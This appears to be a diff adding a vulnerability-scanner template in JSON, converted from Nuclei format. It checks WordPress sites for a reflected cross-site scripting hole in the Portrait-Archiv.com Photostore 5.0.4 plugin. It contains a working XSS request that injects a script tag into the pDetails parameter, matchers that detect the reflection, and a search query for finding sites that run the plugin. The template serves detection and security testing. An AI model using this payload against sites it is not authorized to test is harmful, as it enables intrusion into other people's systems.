@@ -1,0 +1,128 @@
+{
+  "id": "wp-portrait-archiv-xss",
+  "name": "WordPress Portrait-Archiv.com Photostore 5.0.4 - Reflected Cross Site Scripting",
+  "author": "r3Y3r53",
+  "severity": "MEDIUM",
+  "description": "The \u0027pDetails\u0027 GET parameter from the js/imageDetails.php was vulnerable to an unauthenticated reflected XSS attack.\n",
+  "references": [
+    "https://wpscan.com/vulnerability/c6a8757e-41ef-4c20-8c7d-97b57d56fe0e",
+    "https://wordpress.org/plugins/portrait-archiv-shop/",
+    "https://packetstormsecurity.com/files/154343/"
+  ],
+  "tags": [
+    "wpscan",
+    "packetstorm",
+    "wordpress",
+    "wp-plugin",
+    "wp",
+    "portrait-archiv-shop",
+    "xss"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {
+    "publicwww": "/wp-content/plugins/portrait-archiv-shop/"
+  },
+  "variables": {},
+  "variablesType": "sniper",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "GET /wp-content/plugins/portrait-archiv-shop/js/imageDetails.php?pDetails\u003d);});%3C/script%3E%3Cscript%3Ealert(document.location)%3C/script%3E HTTP/1.1\nHost: {{Hostname}}\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "DSL",
+          "values": [
+            "status_code \u003d\u003d 200",
+            "contains(content_type, \"text/html\")",
+            "contains(body, \"\u003c/script\u003e\u003cscript\u003ealert(document.location)\u003c/script\u003e\") \u0026\u0026 contains(body, \"showImageDetail\")"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "OR",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "wp-portrait-archiv-xss",
+    "info": {
+      "name": "WordPress Portrait-Archiv.com Photostore 5.0.4 - Reflected Cross Site Scripting",
+      "author": "r3Y3r53",
+      "severity": "medium",
+      "description": "The \u0027pDetails\u0027 GET parameter from the js/imageDetails.php was vulnerable to an unauthenticated reflected XSS attack.\n",
+      "reference": [
+        "https://wpscan.com/vulnerability/c6a8757e-41ef-4c20-8c7d-97b57d56fe0e",
+        "https://wordpress.org/plugins/portrait-archiv-shop/",
+        "https://packetstormsecurity.com/files/154343/"
+      ],
+      "metadata": {
+        "max_request": 1,
+        "publicwww_query": "/wp-content/plugins/portrait-archiv-shop/"
+      },
+      "tags": "wpscan,packetstorm,wordpress,wp-plugin,wp,portrait-archiv-shop,xss"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "GET /wp-content/plugins/portrait-archiv-shop/js/imageDetails.php?pDetails\u003d);});%3C/script%3E%3Cscript%3Ealert(document.location)%3C/script%3E HTTP/1.1\nHost: {{Hostname}}\n"
+        ],
+        "matchers": [
+          {
+            "type": "dsl",
+            "dsl": [
+              "status_code \u003d\u003d 200",
+              "contains(content_type, \"text/html\")",
+              "contains(body, \"\u003c/script\u003e\u003cscript\u003ealert(document.location)\u003c/script\u003e\") \u0026\u0026 contains(body, \"showImageDetail\")"
+            ],
+            "condition": "and"
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
